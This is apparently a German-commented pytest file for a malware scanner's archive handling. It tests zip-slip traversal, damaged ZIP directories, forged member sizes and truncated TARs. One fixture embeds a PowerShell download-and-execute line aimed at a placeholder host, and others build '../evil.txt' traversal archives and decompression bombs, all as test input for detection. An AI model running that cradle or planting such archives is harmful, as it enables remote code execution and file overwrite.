    # Drittes Kandidaten-Passwort passt (Schleife laeuft weiter)
    assert _read_encrypted(FakeZip("dritt"), _Info(), ["eins", "zwei", "dritt"]) == (
        b"entschluesselt", None,
    )
    # Nichts passt -> (None, None) (Aufrufer meldet 'kein Passwort passte')
    assert _read_encrypted(FakeZip("geheimnis"), _Info(), ["a", "b"]) == (None, None)
    # Ungewoehnliche Exception pro Passwort wird geschluckt, Ende -> (None, None)
    class BoringZip:
        def open(self, info, pwd=None):
            raise ValueError("zip aes not supported")

    assert _read_encrypted(BoringZip(), _Info(), ["a"]) == (None, None)


def test_zipcrypto_member_via_iter_zip(monkeypatch):
    # Der ganze Pfad inkl. is-safe/size-guards mit einer echten
    # klassisch verschluesselten Zip (pyzipper kann nur AES schreiben —
    # deshalb simulieren wir den gemaockten zf auf ZipFile-Ebene).
    from unittest import mock

    from malaz.core import archive as archive_mod

    info = zipfile.ZipInfo("crypt.txt")
    info.flag_bits |= 0x1  # encrypted
    info.file_size = len(b"entschluesselt")  # muss zum Strom passen s.o.
    info.CRC = zlib.crc32(b"entschluesselt") & 0xFFFFFFFF

    class _Ctx(mock.MagicMock):
        # 'with zf:' ohne 'as' bindet nicht neu: der Kontextmanager selbst
        # muss infolist/open bereitstellen.
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    ctx = _Ctx()
    ctx.infolist.return_value = [info]
    # Der Mitgliedsstrom wird chunkweise gelesen (open(...).read(n)), nicht
    # mehr ueber zf.read(info) — die Materialisierung des ganzen Rests war der
    # Befund.
    stream = ctx.open.return_value.__enter__.return_value
    stream.read.side_effect = [b"entschluesselt", b""]
    monkeypatch.setattr(archive_mod.zipfile, "ZipFile", lambda _buf: ctx)
    data = b"egal-der-zip-header"
    members = list(archive_mod.iter_zip_members(data, passwords=["infected"]))
    assert members == [("crypt.txt", b"entschluesselt", None)]


# -- Traversal-Symmetrie ueber alle Container -------------------------------- #

def test_tar_traversal_is_reported_not_dropped():
    """Ein Traversal-Member im TAR muss gemeldet werden, nicht verschwinden.

    Frueher wurde er stillschweigend verworfen ("not a finding"). Damit war
    TAR der leise Weg um ARCH_ZIPSLIP herum: dasselbe Archiv als ZIP gab
    CRITICAL/ROT, als TAR GRUEN/Score 0. Gefunden bei der Pruefung, ob der
    7z-Fix symmetrisch gilt.
    """
    data = _make_tar({"../escape.txt": b"x", "inner/safe.txt": b"harmlos"})
    members = _members(data, "tar")
    errors = [err for _, _, err in members if err]
    assert any(err.startswith("Zip-Slip:") for err in errors), errors
    # Der harmlose Teil wird weiterhin ausgeliefert: der Angriff darf die
    # Analyse des restlichen Archivs nicht kosten.
    assert any(n == "inner/safe.txt" and e is None for n, _b, e in members)


def test_tar_without_traversal_reports_no_zipslip():
    """Gegenprobe: ein sauberes TAR erzeugt keinen Zip-Slip-Befund."""
    data = _make_tar({"a.txt": b"ok", "sub/b.txt": b"fine"})
    members = _members(data, "tar")
    assert not any(err and "Zip-Slip" in err for _, _, err in members), members


def test_container_traversal_symmetry():
    """ZIP und TAR melden denselben Angriff gleich — als ARCH_ZIPSLIP.

    Das ist die eigentliche Zusicherung: kein Container darf der leise Weg
    an der Erkennung vorbei sein.
    """
    from malaz.core.dispatcher import Dispatcher

    note = Dispatcher()._container_note(
        "Zip-Slip: 1 Eintragsname(n) wuerden aus dem Ziel schreiben",
        "(TAR/komprimierter Inhalt)",
        0,
        "ARCH_TAR_ERROR",
        "Container konnte nicht entpackt werden",
    )
    rules = {i.rule_id: i for i in note.indicators}
    assert "ARCH_ZIPSLIP" in rules, sorted(rules)
    assert rules["ARCH_ZIPSLIP"].weight == 50


# -- Unlesbares Zentralverzeichnis: Inhalt ungeprueft ist kein sauberes Urteil -- #
#
# Befund: ``iter_zip_members`` kehrte bei ``zipfile.BadZipFile`` still zurueck.
# Nur vier zerschlagene Bytes (die EOCD-Signatur) genuegen dafuer: Local File
# Header und Deflate-Strom bleiben vollstaendig lesbar, 7-Zip und ``zip -FF``
# holen die Nutzlast heraus. Der Dispatcher sah einen leeren Iterator, legte
# weder Notiz noch Kind an, und als einzige Spur blieb ARCH_BADZIP mit LOW/5 —
# unter SCORE_GREEN_MAX=19. Gemessen: dasselbe Archiv mit intaktem EOCD ROT 100
# (Mitglied gescannt), mit defektem EOCD GRUEN 5 (Nutzlast nie angesehen).


def _damage_central_directory(data: bytes) -> bytes:
    """Zerstoert die EOCD-Signatur; alles andere bleibt unveraendert."""
    idx = data.rfind(b"PK\x05\x06")
    assert idx > 0, "EOCD nicht gefunden"
    return data[:idx] + b"XX\x05\x06" + data[idx + 4:]


def _swf_carrier_zip() -> bytes:
    """Ein ZIP, dessen Nutzlast erst beim Entpacken lesbar wird.

    Das Mitglied ist ein komprimiertes SWF: der Skripttext steckt im
    zlib-Strom, im Aussen-Container steht also kein lesbares Signal. Genau
    darum geht es im Befund — die Nutzlast ist da, nur nicht sichtbar.
    """
    import struct
    import zlib

    script = (
        b"IEX (New-Object Net.WebClient).DownloadString("
        b"'http://malware.invalid/payload.ps1'); "
    ) * 4
    swf = b"CWS\x09" + struct.pack("<I", len(script)) + zlib.compress(script)
    return _make_zip({"movie.swf": swf})


def test_iter_reports_unreadable_central_directory():
    """Der Iterator muss den unlesbaren Container melden, nicht enden."""
    members = list(
        iter_zip_members(_damage_central_directory(_make_zip({"a.txt": b"x"})))
    )
    assert len(members) == 1, members
    name, payload, err = members[0]
    assert name == "" and payload == b""
    assert err and "nicht lesbar" in err and "NICHT geprüft" in err


def test_unreadable_central_directory_is_not_silent():
    """Gegenprobe: ein lesbares Archiv erzeugt keine solche Notiz."""
    members = list(iter_zip_members(_make_zip({"a.txt": b"x"})))
    assert [m for m in members if not m[0] and m[2]] == []


def test_corrupt_zip_keeps_the_weighted_unchecked_note(dispatcher, tmp_path):
    """Guard: ARCH_BADZIP und die gewichtete Notiz gibt es nur zusammen.

    ARCH_BADZIP selbst traegt bewusst **kein** Gewicht mehr ("eine Ursache,
    eine gewichtete Aussage"): der scorewirksame Teil kommt aus der
    namenlosen Container-Notiz des Mitglieder-Iterators (ARCH_ZIP_ERROR,
    MEDIUM/25). Genau das nagelt dieser Test fest, gemessen ueber die
    Indikatorliste des Ergebnisses — kein Pfad darf die gewichtete Aussage
    verlieren, und keiner darf sie doppelt fuehren (5+25 bzw. 25+25 summierte
    sich und behauptete bei 50 = ANCHOR_CRITICAL_SCORE "boesartig", wo nur
    "ungeprueft" gilt).
    """
    from malaz.models import RiskLevel

    damaged = _damage_central_directory(_make_zip({"a.txt": b"x"}))
    r = _scan_file(dispatcher, damaged, tmp_path / "damaged.zip")

    weights = {i.rule_id: i.weight for i in r.all_indicators()}
    # Der Kern zuerst: "ungeprueft" ist GELB. GRUEN hiesse "sauber" (Zustand
    # vor dem Fix: ARCH_BADZIP(5) ohne Notiz), ROT hiesse "boesartig"
    # (Ueberkorrektur: Notiz(25) + ARCH_BADZIP(25) = 50).
    assert r.risk_level == RiskLevel.YELLOW, f"score={r.score} rules={sorted(weights)}"
    assert "ARCH_BADZIP" in weights, sorted(weights)  # die Ursache wird gemeldet
    assert weights["ARCH_BADZIP"] == 0, sorted(weights)
    assert weights.get("ARCH_ZIP_ERROR", 0) >= 25, sorted(weights)


def test_corrupt_zip_at_the_depth_limit_keeps_a_weighted_unchecked_note(
    dispatcher, tmp_path, monkeypatch
):
    """Die eine Ausnahme zum Guard, festgehalten statt versteckt.

    Oberhalb von ``MAX_ARCHIVE_DEPTH`` laeuft die Mitglieder-Rekursion nicht
    mehr — hier feuert ARCH_BADZIP also OHNE die ARCH_ZIP_ERROR-Notiz. Damit
    ARCH_BADZIP trotzdem nicht dasteht, muss in diesem Pfad eine andere Stufe
    die gewichtete Aussage "Inhalt ungeprueft" tragen: der Tiefenlimit-
    Indikator (MEDIUM/25, Teil des Dispatcher-Fixes dieser Runde). Kein Pfad
    darf beides verlieren — genau das prueft dieser Test.
    """
    from malaz.models import RiskLevel

    monkeypatch.setattr(config, "MAX_ARCHIVE_DEPTH", 1)
    inner = _damage_central_directory(_make_zip({"a.txt": b"x"}))
    outer = _make_zip({"inner.zip": inner})
    r = _scan_file(dispatcher, outer, tmp_path / "outer.zip")

    weights = {i.rule_id: i.weight for i in r.all_indicators()}
    assert "ARCH_BADZIP" in weights, sorted(weights)
    assert weights.get("ARCH_DEPTH_LIMIT", 0) >= 25, sorted(weights)
    assert r.risk_level != RiskLevel.GREEN


def test_damaged_central_directory_is_not_a_clean_verdict(dispatcher, tmp_path):
    """End-to-end: das defekte Archiv darf nicht als sauber durchgehen."""
    from malaz.models import RiskLevel

    carrier = _swf_carrier_zip()
    intact = _scan_file(dispatcher, carrier, tmp_path / "intact.zip")
    # Die Nutzlast ist nachweislich da — sie wird als Kind gescannt.
    assert intact.children, "das intakte Archiv muss die Nutzlast scannen"
    assert intact.risk_level != RiskLevel.GREEN

    damaged = _scan_file(
        dispatcher, _damage_central_directory(carrier), tmp_path / "damaged.zip"
    )

    # Der Inhalt ist weiterhin nicht entpackbar — das ist ein Fakt. Was nicht
    # passieren darf: dass dieses Nichtwissen als "sauber" gelesen wird.
    assert damaged.children, "die Nichtauswertung muss als Notiz sichtbar sein"
    assert damaged.risk_level != RiskLevel.GREEN
    weights = {i.rule_id: i.weight for i in damaged.all_indicators()}
    assert weights.get("ARCH_ZIP_ERROR", 0) >= 25, sorted(weights)


# -- TAR: der Limit-Return verschluckte die Zip-Slip-Notiz ------------------- #
#
# Befund ``malaz/core/archive.py/tar-zipslip-note-verloren``. Die Meldung
# entstand als LETZTES yield nach dem Walk; die beiden Limit-Pfade kehrten aber
# mit ``return`` zurueck (Eintrags- und Volumenlimit) und sprangen damit ueber
# die Meldestelle. Gemessen: ein TAR mit Traversal-Namen und einem greifenden
# Limit lieferte nur die Stop-Notiz — Urteil YELLOW 25, in jeder Zahl identisch
# mit demselben Archiv OHNE den Traversal-Namen. Fix: ``break`` statt
# ``return``, der Durchlauf faellt auf das Summary durch (Reihenfolge wie
# ``core/sevenzip.py:253-267``).
#
# Die zweite Haelfte desselben Befunds — ein Traversal hinter so fetten
# Mitgliedern, dass der Nachlauf ``_drain_container_notes`` sie nicht mehr
# zieht — liegt in ``core/dispatcher.py`` und wird dort gefixt. Diese Tests
# nageln die Iterator-Seite fest: kein Limit darf den Befund ueberspringen.


def test_tar_traversal_survives_the_entry_limit(monkeypatch):
    """Eintragslimit: der Walk bricht ab, die Zip-Slip-Meldung bleibt."""
    monkeypatch.setattr(config, "MAX_ARCHIVE_ENTRIES", 4)
    data = _make_tar(
        {
            "a.txt": b"1",
            "../evil.txt": b"pwn",
            "b.txt": b"2",
            "c.txt": b"3",
            "d.txt": b"4",
            "e.txt": b"5",
        }
    )
    members = _members(data, "tar")
    errors = [err for _, _, err in members if err]
    assert any(err.startswith("Zip-Slip:") for err in errors), errors
    assert any(err.startswith("Auswertung gestoppt:") for err in errors), errors


def test_tar_traversal_survives_the_volume_limit(monkeypatch):
    """Volumenlimit: derselbe Kurzschluss, derselbe Verlust."""
    monkeypatch.setattr(config, "MAX_UNCOMPRESSED_SIZE", 8)
    data = _make_tar(
        {
            "a.txt": b"1234",
            "../evil.txt": b"pwn",
            "big.bin": b"y" * 64,
        }
    )
    members = _members(data, "tar")
    errors = [err for _, _, err in members if err]
    assert any(err.startswith("Zip-Slip:") for err in errors), errors
    assert any(err.startswith("Auswertung gestoppt:") for err in errors), errors


def test_tar_traversal_is_not_numerically_silent(dispatcher, tmp_path, monkeypatch):
    """End-to-end: mit Traversal darf das Urteil nicht das des sauberen sein.

    Genau das war der Befund — die beiden Archive waren in jeder Zahl gleich.
    """
    from malaz.models import RiskLevel

    monkeypatch.setattr(config, "MAX_ARCHIVE_ENTRIES", 20)
    entries = {f"a{i:02d}.txt": b"x" for i in range(10)}
    entries["../evil.txt"] = b"pwn"
    entries.update({f"b{i:02d}.txt": b"y" for i in range(15)})

    attack = _make_tar(entries)
    clean = _make_tar({k: v for k, v in entries.items() if k != "../evil.txt"})

    r_attack = _scan_file(dispatcher, attack, tmp_path / "attack.tar")
    r_clean = _scan_file(dispatcher, clean, tmp_path / "clean.tar")

    ids = {i.rule_id for i in r_attack.all_indicators()}
    assert "ARCH_ZIPSLIP" in ids, sorted(ids)
    assert r_attack.risk_level == RiskLevel.RED, r_attack.score
    assert r_clean.risk_level == RiskLevel.YELLOW, r_clean.score
    assert (r_attack.score, sorted(ids)) != (
        r_clean.score,
        sorted(i.rule_id for i in r_clean.all_indicators()),
    )


# -- ZIP: die Mitgliedsgroesse ist ein Angreiferwert ------------------------- #
#
# Befund ``malaz/core/archive/zip-mitgliedsgroesse-deklariert-nicht-tatsaechlich``.
# ``iter_zip_members`` prueft ``info.file_size`` (Wert aus dem
# Zentralverzeichnis) und las danach mit ``zf.read(info)``. ``ZipExtFile.read(-1)``
# ruft ``_read1(2**31-1)``: der GANZE Reststrom wird in EINEM ``decompress()``
# entpackt und erst danach auf die deklarierte Groesse geschnitten
# (``data = data[:self._left]`` — ``_left`` ist der CD-Wert). Gemessen: eine
# 1.019,3-KiB-ZIP, deren Mitglied als 1000 B deklariert war und 1 GiB Nullbytes
# enthielt, erzeugte 2049,0 MiB tracemalloc-Spitze in 2,09 s und lieferte 1000
# Bytes ohne Fehler (Dispatcher GRUEN 0); dieselben Bytes ehrlich deklariert:
# 0,0 MiB und sofortige Ablehnung (ROT 85). Fix: chunkweise lesen ueber das
# vorhandene Muster ``_decompress_bounded``, den Strom nicht mehr an der
# Deklaration kappen (eigener ``ZipInfo``-Kopie mit ``file_size + 1``) und die
# tatsaechliche Laenge samt CRC gegen die Deklaration pruefen.


def _patch_declaration(data: bytes, name: str, declared: int, crc_value: int) -> bytes:
    """Setzt file_size (und CRC) eines Eintrags im Zentralverzeichnis."""
    sig = b"PK\x01\x02"
    idx = data.find(sig)
    while idx != -1:
        name_len = int.from_bytes(data[idx + 28:idx + 30], "little")
        if data[idx + 46:idx + 46 + name_len] == name.encode():
            out = bytearray(data)
            out[idx + 16:idx + 20] = crc_value.to_bytes(4, "little")
            out[idx + 24:idx + 28] = declared.to_bytes(4, "little")
            return bytes(out)
        idx = data.find(sig, idx + 1)
    raise AssertionError("Eintrag nicht im Zentralverzeichnis gefunden")


def _zip_declaring(name: str, actual: bytes, declared: int) -> bytes:
    """ZIP, deren Eintrag eine andere Groesse deklariert als er liefert.

    Der Deflate-Strom bleibt vollstaendig; geaendert werden nur vier Bytes im
    Zentralverzeichnis, und der CRC passt zu den ersten ``declared`` Bytes —
    genau die Praeparation aus dem Befund.
    """
    data = _make_zip({name: actual})
    return _patch_declaration(
        data, name, declared, zlib.crc32(actual[:declared]) & 0xFFFFFFFF
    )


def test_zip_lying_size_is_reported_not_silently_truncated(monkeypatch):
    """Der gelogene Eintrag frisst keinen Speicher und geht nicht still durch."""
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 2 * 1024 * 1024)
    actual = b"\x00" * (64 * 1024 * 1024)  # 64 MiB, deflate-komprimiert ~64 KiB
    data = _zip_declaring("bomb.bin", actual, declared=1000)

    tracemalloc.start()
    members = list(iter_zip_members(data))
    peak = tracemalloc.get_traced_memory()[1]
    tracemalloc.stop()

    assert len(members) == 1, members
    name, payload, err = members[0]
    assert name == "bomb.bin"
    # Gemeldet statt abgeschnitten: vorher kamen hier 1000 Bytes OHNE Fehler
    # zurueck (und der Dispatcher urteilte GRUEN 0).
    assert payload == b"", len(payload)
    assert err and "gefälscht" in err, err
    # Harte Grenze: vorher materialisierte das eine read(-1) den ganzen Strom
    # (gemessen 141 MiB fuer dieses Mitglied, 2049 MiB fuer das 1-GiB-Original).
    budget = 4 * config.MAX_EXTRACTED_FILE_SIZE
    assert peak < budget, f"{peak / 1048576:.1f} MiB >= {budget / 1048576:.1f} MiB"


def test_zip_lying_size_is_not_a_clean_verdict(dispatcher, tmp_path, monkeypatch):
    """End-to-end: das gefaelschte Mitglied muss als "ungeprueft" erscheinen."""
    from malaz.models import RiskLevel

    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 2 * 1024 * 1024)
    data = _zip_declaring(
        "bomb.bin", b"\x00" * (32 * 1024 * 1024), declared=1000
    )
    r = _scan_file(dispatcher, data, tmp_path / "lying.zip")

    weights = {i.rule_id: i.weight for i in r.all_indicators()}
    assert weights.get("ARCH_MEMBER_ERROR", 0) >= 25, sorted(weights)
    assert r.risk_level != RiskLevel.GREEN, r.score


def test_zip_over_declared_size_is_reported(monkeypatch):
    """Die Gegenrichtung: mehr deklariert als geliefert ist ebenso ein Befund."""
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 1024 * 1024)
    data = _zip_declaring("short.bin", b"kurz", declared=4096)
    name, payload, err = next(iter(iter_zip_members(data)))
    assert name == "short.bin"
    assert payload == b""
    assert err and "widerspricht" in err, err


def test_zip_corrupted_member_reports_crc_not_forgery(monkeypatch):
    """BUG-013: one flipped byte in a STORED member is damage, not a fake size.

    The stdlib CRC check fired on the ``declared+1`` probe read and was mapped
    to "Größenangabe … gefälscht"; the real CRC branch was unreachable.
    """
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 1024 * 1024)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        zf.writestr("damaged.bin", b"ABCDEFGH")
    data = bytearray(buf.getvalue())
    payload_at = data.find(b"ABCDEFGH")
    assert payload_at >= 0
    data[payload_at] ^= 0xFF

    name, payload, error = next(iter(iter_zip_members(bytes(data))))
    assert name == "damaged.bin"
    assert payload == b""
    assert error and "CRC" in error, error
    assert "gefälscht" not in error, (
        "ein beschädigtes Mitglied darf nicht als Größenfälschung gelten"
    )


def test_zip_honest_member_is_read_unchanged(monkeypatch):
    """Gegenrichtung: ein ehrliches Mitglied kommt unveraendert und ganz an."""
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 8 * 1024 * 1024)
    payload = b"malaz" * (512 * 1024)  # 2,5 MiB
    members = list(iter_zip_members(_make_zip({"honest.bin": payload})))
    assert members == [("honest.bin", payload, None)]


def test_zip_honest_large_member_is_rejected_before_reading(monkeypatch):
    """Gegenrichtung: ehrlich deklariert und zu gross -> Ablehnung wie bisher."""
    monkeypatch.setattr(config, "MAX_EXTRACTED_FILE_SIZE", 1024 * 1024)
    payload = b"\x00" * (4 * 1024 * 1024)

    tracemalloc.start()
    members = list(iter_zip_members(_make_zip({"big.bin": payload})))
    peak = tracemalloc.get_traced_memory()[1]
    tracemalloc.stop()

    name, blob, err = members[0]
    assert name == "big.bin" and blob == b""
    assert err and "zu groß" in err, err
    # Der Pre-Check greift auf der Deklaration: entpackt wird nichts.
    assert peak < 1024 * 1024, f"{peak / 1048576:.2f} MiB"


# -- echtes ZipCrypto: der stdlib kann es nur LESEN, nicht schreiben --------


def _zipcrypto_table() -> list[int]:
    table = []
    for i in range(256):
        c = i
        for _ in range(8):
            c = (c >> 1) ^ (0xEDB88320 if c & 1 else 0)
        table.append(c & 0xFFFFFFFF)
    return table


_ZC_TABLE = _zipcrypto_table()


def _build_zipcrypto_zip(name: str, plaintext: bytes, password: bytes) -> bytes:
    """Ein klassisch verschlüsseltes ZIP, von Hand gebaut.

    ``zipfile`` kann ZipCrypto nur lesen, ``pyzipper`` nur AES schreiben —
    ein echtes verschlüsseltes Mitglied lässt sich also nur selbst bauen. Ohne
    einen solchen Fixture bleibt der ganze ZipCrypto-Pfad ungetestet, und genau
    dort hat Runde 4 mit ``probe.CRC = None`` die Entschlüsselung zerlegt (der
    stdlib leitet den Prüfbyte aus ``CRC`` ab).
    """
    import struct

    crc = zlib.crc32(plaintext) & 0xFFFFFFFF
    k = [0x12345678, 0x23456789, 0x34567890]

    def crc32_byte(c: int, byte: int) -> int:
        return ((c >> 8) & 0xFFFFFF) ^ _ZC_TABLE[(c ^ byte) & 0xFF]

    def update(byte: int) -> None:
        k[0] = crc32_byte(k[0], byte)
        k[1] = (k[1] + (k[0] & 0xFF)) & 0xFFFFFFFF
        k[1] = (k[1] * 134775813 + 1) & 0xFFFFFFFF
        k[2] = crc32_byte(k[2], (k[1] >> 24) & 0xFF)

    def stream_byte() -> int:
        temp = (k[2] | 2) & 0xFFFF
        return ((temp * (temp ^ 1)) >> 8) & 0xFF

    # Die Schlüssel werden mit dem Passwort initialisiert, BEVOR der erste
    # Klartextbyte sie weiterdreht — ohne das entschlüsselt der stdlib den
    # Kopf zu etwas anderem und meldet "Bad password" (selbst gemessen: der
    # Prüfbyte kam als 0x62 statt 0x1c zurück).
    for b in password:
        update(b)

    def encrypt(data: bytes) -> bytes:
        out = bytearray()
        for p in data:
            c = stream_byte()
            out.append(p ^ c)
            update(p)
        return bytes(out)

    header = bytes(range(11)) + bytes([(crc >> 24) & 0xFF])
    body = encrypt(header) + encrypt(plaintext)
    # Flag 0x1 = verschlüsselt, Methode 0 = STORED (kein Deflate nötig).
    local = struct.pack(
        "<4s5H3L2H", b"PK\x03\x04", 20, 0x1, 0, 0, 0, crc, len(body),
        len(plaintext), len(name), 0,
    ) + name.encode("ascii")
    central = struct.pack(
        "<4s6H3L5H2L", b"PK\x01\x02", 20, 20, 0x1, 0, 0, 0, crc, len(body),
        len(plaintext), len(name), 0, 0, 0, 0, 0, 0,
    ) + name.encode("ascii")
    eocd = struct.pack(
        "<4s4H2LH", b"PK\x05\x06", 0, 0, 1, 1, len(central), len(local) + len(body), 0
    )
    return local + body + central + eocd


def test_zipcrypto_member_with_known_password_is_decrypted():
    """Der bekannte Schlüssel muss das Mitglied öffnen — auch nach dem Umbau.

    Regression (Runde 5): ``probe.CRC = None`` in ``_read_zip_member`` brach
    die klassische Verschlüsselung. Der stdlib leitet den ZipCrypto-Prüfbyte
    aus ``zipinfo.CRC`` ab (``check_byte = (zipinfo.CRC >> 24) & 0xff``), also
    warf ``None >> 24`` einen TypeError, den die Kandidatenschleife als
    "falsches Passwort" las. Gemessen: das Mitglied kam als 0 Bytes zurück
    statt als sein Klartext.
    """
    plain = b"entschluesselt-und-nicht-leer"
    data = _build_zipcrypto_zip("crypt.txt", plain, b"infected")

    # Gegenprobe zuerst: der stdlib selbst liest das Archiv (sonst wäre der
    # Fixture falsch und der Test darunter wertlos).
    import io as _io

    std = zipfile.ZipFile(_io.BytesIO(data))
    std.setpassword(b"infected")
    assert std.read("crypt.txt") == plain, "Fixture ist kein gültiges ZipCrypto"

    members = list(iter_zip_members(data, passwords=["falsch", "infected"]))
    assert members == [("crypt.txt", plain, None)], members


def test_tar_gz_entry_limit_is_not_reported_as_truncated(monkeypatch):
    """BUG-002: a COMPLETE .tar.gz must not claim a capped download.

    The metadata pass stops at ``MAX_ARCHIVE_ENTRIES``; its remaining stream is
    non-zero, and the truncation check read that as a cut.
    """
    monkeypatch.setattr(config, "MAX_ARCHIVE_ENTRIES", 3)
    data = _make_tar(
        {f"f{i}.txt": b"x" * 10 for i in range(10)}, compress="gzip"
    )
    errors = [error for _name, _payload, error in _members(data, "gzip") if error]
    assert any("Eintrags-Limit" in error for error in errors), errors
    assert not any(
        "Endmarker" in error or "unvollst" in error for error in errors
    ), errors


def test_truncated_tar_keeps_members_and_zipslip_report():
    """Ein abgeschnittener TAR darf nicht alles verlieren.

    Regression (Runde 6): der Metadaten-Vorlauf aus Runde 5 sammelt erst alle
    ``TarInfo`` und laeuft dann ueber die Liste. Endet ein TAR mitten in den
    Daten eines Mitglieds, wirft schon das Kopfelesen — und weil beide Schleifen
    im selben ``try`` lagen, endete der Generator, BEVOR ein Mitglied oder der
    Zip-Slip-Bericht ausgeliefert war. Gemessen: 1 Eintrag (nur die
    Fehlernotiz) statt 2 Mitgliedern plus Traversal-Meldung, die der
    Runde-4-Stand noch geliefert hatte.

    Die gesammelten Objekte bleiben benutzbar; die Kappung wird zur Notiz
    NEBEN dem Inhalt, statt ihn zu ersetzen.
    """
    import io as _io
    import tarfile

    buf = _io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name in ("a.txt", "../evil.txt", "c.txt"):
            ti = tarfile.TarInfo(name)
            ti.size = 2048
            tf.addfile(ti, _io.BytesIO(b"z" * 2048))
    full = buf.getvalue()
    # Schnitt INNERHALB der Daten des letzten Mitglieds
    idx = full.rfind(b"c.txt")
    data_start = ((idx + len(b"c.txt")) // 512 + 1) * 512
    cut = full[: data_start + 1000]

    out = list(iter_compressed_members(cut, "tar"))
    names = [n for n, _, _ in out if n]
    errors = [e for _, _, e in out if e]
    assert "a.txt" in names, f"das lesbare Mitglied ging verloren: {names}"
    assert any("Zip-Slip" in e for e in errors), (
        f"der Traversal-Bericht ging verloren: {errors}"
    )
    assert any("TAR-Fehler" in e or "unexpected end" in e for e in errors), (
        f"die Kappung wurde nicht gemeldet: {errors}"
    )


def test_truncated_tar_is_still_red_end_to_end(dispatcher, tmp_path):
    """Ende-zu-Ende: der Traversal im gekappten TAR bleibt ein CRITICAL-Anker."""
    import io as _io
    import tarfile

    from malaz.models import RiskLevel

    buf = _io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        ti = tarfile.TarInfo("../evil.txt")
        ti.size = 4
        tf.addfile(ti, _io.BytesIO(b"evil"))
        t = tarfile.TarInfo("payload.txt")
        t.size = 4096
        tf.addfile(t, _io.BytesIO(b"p" * 4096))
    full = buf.getvalue()
    cut = full[: len(full) - 2000]  # mitten in payload.txt

    r = _scan_file(dispatcher, cut, tmp_path / "cut.tar")
    ids = {i.rule_id for i in r.all_indicators()}
    assert "ARCH_ZIPSLIP" in ids, f"Traversal verloren: {sorted(ids)}"
    assert r.risk_level == RiskLevel.RED, f"score={r.score} {sorted(ids)}"


def _tar_three_members(size: int = 2048) -> bytes:
    import io as _io
    import tarfile

    buf = _io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for name in ("a.txt", "b.txt", "c.txt"):
            ti = tarfile.TarInfo(name)
            ti.size = size
            tf.addfile(ti, _io.BytesIO(b"z" * size))
    return buf.getvalue()


def test_tar_cut_inside_a_header_block_is_reported():
    """Ein Schnitt im 512-Byte-Kopfblock ist STILL — tarfile schluckt es.

    Regression (Runde 7): ``TarFile.next()`` verschluckt
    ``TruncatedHeaderError``/``EmptyHeaderError``, sobald ``offset != 0``
    (tarfile.py:2657-2661), und meldet ein sauberes Archivende. Der Scan gab
    dann die Mitglieder vor dem Schnitt aus und sagte nichts: gemessen
    verloren 1024 von 10 239 Schnittstellen eines Drei-Mitglieder-TARs Inhalt
    spurlos, und Schnitt 2816 ergab GRUEN 0, waehrend Schnitt 3072 (ein Byte
    spaeter) ROT 50 ergab. Der Endmarker wird deshalb geprueft, statt dem
    Ausbleiben einer Ausnahme zu vertrauen.
    """
    full = _tar_three_members()
    out = list(iter_compressed_members(full[:2816], "tar"))
    errors = [e for _, _, e in out if e]
    assert errors, "die Kappung im Kopfblock blieb still"
    assert any("Endmarker" in e or "unvollst" in e or "TAR-Fehler" in e for e in errors), errors


def test_a_complete_tar_is_not_reported_as_truncated():
    """Gegenrichtung: der Endmarker-Check darf ein sauberes Archiv nicht treffen."""
    full = _tar_three_members()
    out = list(iter_compressed_members(full, "tar"))
    assert [e for _, _, e in out if e] == [], "sauberes Archiv als gekappt gemeldet"
    assert len([n for n, _, _ in out if n]) == 3


def test_truncated_gz_does_not_escape_as_a_hard_failure():
    """Ein gekapptes .tar.gz wirft EOFError — nicht TarError, also ungefangen.

    Regression (Runde 7): ``gzip`` meldet „Compressed file ended before the
    end-of-stream marker was reached\" aus ``next()`` heraus; das ist keine
    ``tarfile.TarError``, entkam dem Iterator und wurde zur harten
    Container-Fehlermeldung statt zur weichen Notiz.
    """
    import gzip

    gz = gzip.compress(_tar_three_members(4096))
    out = list(iter_compressed_members(gz[: len(gz) - 8], "gzip"))
    errors = [e for _, _, e in out if e]
    assert errors, "die Kappung des .tar.gz blieb still"
    assert all("TAR-Fehler" in e or "Endmarker" in e for e in errors), errors


def test_tar_truncation_is_counted_once(dispatcher, tmp_path):
    """Eine Ursache, eine gewichtete Aussage — BEIDE Schnittarten, je einmal.

    Regression (Runde 7): die Container-Notiz (25) und der Mitgliedsfehler
    derselben Kappung (25) addierten sich zu 50 = ``ANCHOR_CRITICAL_SCORE``:
    ein abgeschnittener Download galt als "boesartig". Gemessen vor dem Fix
    Schnitt 3584 -> ROT 50, danach GELB 25.

    Beide Schnitte muessen geprueft werden, weil sie sich asymmetrisch
    verhalten: bei 2816 (im Kopfblock) gibt es GAR KEINE Mitgliedsnotiz, das
    Gewicht kann also nur an der Container-Notiz haengen — faellt sie auf 0,
    ist der stille Fall aus Runde 7 zurueck. Bei 3584 gibt es beide, und dort
    muss die Folge-Notiz des Mitglieds weichen.
    """
    from malaz.models import RiskLevel

    full = _tar_three_members()
    for cut, label in ((2816, "Kopfblock"), (3584, "Mitgliedsdaten")):
        r = _scan_file(dispatcher, full[:cut], tmp_path / f"cut{cut}.tar")
        weights = {i.rule_id: i.weight for i in r.all_indicators() if i.weight}
        assert r.risk_level != RiskLevel.RED, f"{label}: score={r.score} {weights}"
        assert r.risk_level != RiskLevel.GREEN, f"{label}: die Kappung verschwand {weights}"
        assert len(weights) == 1, f"{label}: dieselbe Ursache zaehlt mehrfach {weights}"

    # Gegenprobe: ein sauberes Archiv bleibt unauffaellig.
    clean = _scan_file(dispatcher, full, tmp_path / "clean.tar")
    assert clean.risk_level == RiskLevel.GREEN, f"score={clean.score}"


# -- Angriff und ungewoehnlicher Name sind NICHT dasselbe -------------------- #


def test_geraetename_ist_kein_zipslip():
    """Gemeldet vom Nutzer: "das ist doch uebertrieben".

    Ein Zip, das NUR eine Datei namens "CON.txt" enthaelt, hat keinen
